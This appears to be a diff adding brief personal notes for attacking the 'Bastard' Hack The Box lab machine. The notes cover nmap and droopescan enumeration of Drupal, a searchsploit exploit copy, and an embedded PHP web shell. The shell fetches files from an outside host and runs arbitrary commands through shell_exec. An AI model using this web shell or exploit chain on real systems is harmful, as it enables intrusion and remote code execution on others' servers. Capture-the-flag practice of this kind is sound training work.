@@ -1,0 +1,27 @@
+sudo nmap -sS -sV -O bastard.htb
+
+./droopescan scan drupal -u bastard.htb
+
+drupal read about  the file-structure. changelogs releasenotes
+
+searchsploit -x exploits/php/webapps/41564.php
+cp /usr/share/exploitdb/exploits/php/webapps/41564.php .
+
+create a manually shell
+
+$phpCode = <<<'EOD'
+<?php
+ if (isset($_REQUEST['fupload'])) {
+	file_put_contents($_REQUEST['fupload'], file_get_contents("http://bastard.htb:8000/" . $_REQUEST['fupload']));
+};
+if (isset($_REQUEST['fexec'])) {
+	echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
+?>
+EOD;
+$file = [
+    'filename' => 'xsisec.php',
+    'data' => $phpCode
+];
+
+
+
